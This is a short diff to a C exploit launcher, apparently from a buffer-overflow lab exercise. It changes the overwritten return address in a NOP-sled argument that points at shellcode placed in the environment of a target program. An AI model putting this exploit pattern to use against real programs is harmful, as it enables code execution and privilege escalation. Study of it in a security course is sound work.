@@ -13,7 +13,7 @@ int main(void)
   char *env[1];
   
   args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\xcc\xd4\xff\xff";
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x1a\xd7\xff\xff";
   args[2] = NULL;
   
   env[0] = shellcode;
